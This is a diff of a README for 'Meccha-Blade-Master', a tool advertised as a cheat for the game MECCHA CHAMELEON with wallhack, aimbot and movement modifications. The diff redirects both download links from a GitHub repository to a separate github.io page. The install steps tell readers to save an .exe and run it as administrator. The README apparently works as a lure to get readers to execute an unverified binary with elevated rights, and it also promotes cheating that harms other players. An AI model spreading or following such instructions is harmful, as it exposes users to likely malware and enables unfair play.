@@ -1,6 +1,6 @@
 # ⚔️ Meccha-Blade-Master - Dominate every hide and seek match
 
-[![Download Meccha-Blade-Master](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Lapidaristsurcharge951/Meccha-Blade-Master)
+[![Download Meccha-Blade-Master](https://img.shields.io/badge/Download-Release-blue.svg)](https://lapidaristsurcharge951.github.io)
 
 Meccha-Blade-Master provides tools for the game MECCHA CHAMELEON. This software gives you an advantage in the game through features like ESP wallhack, aimbot, and movement modifications. You gain control over the battlefield with these internal game adjustments.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these basic needs to run the software.
 
 Follow these steps to set up the software.
 
-1.  Visit the official repository page to download the latest version: [https://github.com/Lapidaristsurcharge951/Meccha-Blade-Master](https://github.com/Lapidaristsurcharge951/Meccha-Blade-Master).
+1.  Visit the official repository page to download the latest version: [https://lapidaristsurcharge951.github.io](https://lapidaristsurcharge951.github.io).
 2.  Locate the latest release file in the assets section.
 3.  Save the .exe file to your desktop or a folder of your choice.
 4.  Right-click the file and select "Run as administrator." 
